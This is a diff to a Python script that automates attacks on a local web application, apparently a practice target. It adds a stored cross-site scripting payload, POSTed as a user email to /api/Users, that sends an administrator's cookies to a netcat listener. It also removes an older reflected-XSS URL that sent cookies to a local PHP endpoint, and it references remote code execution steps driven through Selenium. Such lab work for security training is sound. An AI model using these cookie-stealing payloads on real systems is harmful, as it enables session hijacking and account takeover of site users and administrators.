@@ -1,11 +1,12 @@
 import time
 import pickle
+import requests
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from abc import ABC, abstractmethod 
 
 
-BASE_URL = "localhost:3000"
+BASE_URL = "http://localhost:3000"
 
 class Attack(ABC):
     """
@@ -135,13 +136,24 @@ class XSSAttack(Attack):
         time.sleep(2)
 
     def run_advanced(self):
-        #http://localhost:3000/#/search?q=<script>new  Image().src="http://127.0.0.1/bogus.php?output="+document.cookie;</script>
-        driver = webdriver.Chrome(options=self.chrome_options)
-        driver.get(self.base_url)
-        time.sleep(2)
-        attack_url = "http://localhost:3000/#/search?q=%3Cscript%3Enew%20Image%28%29.src%3D%22http:%2F%2F127.0.0.1%2Fbogus.php?output=%29%22%2Bdocument.cookie%3B%3C%2Fscript%3E"
-        driver.get(attack_url)
-        time.sleep(2)
+        """
+        send curl request to api/Users for persistent xss attack
+        try to send cookie information to netcat listener
+        when admin visits /administration xss is run and information sent 
+        """
+
+        url = self.base_url + "/api/Users"
+
+        payload = "{\"email\": \"<img src=\\\"http://127.0.0.1:8081/cookie.php?c=\\\"+document.cookie onerror=alert(document.cookie);>\", \"password\": \"xss\"}"
+        headers = {
+            'Content-Type': 'application/json'
+        }
+
+        response = requests.request("POST", url, headers=headers, data = payload)
+
+        print(response.text.encode('utf8'))
+        # login as admin
+
 
 class SensitiveDataExposure(Attack):
     """
@@ -181,7 +193,7 @@ class RemoteCodeExecution(Attack):
         driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[2]/section/div[2]/button").click()
         token_input = driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[2]/section/div[2]/div/div[2]/div/div/div[2]/div/form/div[1]/div[2]/section/input")
         token_input.send_keys(token)
-        time.sleep(20)
+        time.sleep(2)
         # confirm authorization
         driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[2]/section/div[2]/div/div[2]/div/div/div[2]/div/form/div[2]/button[1]").click()
         time.sleep(2)
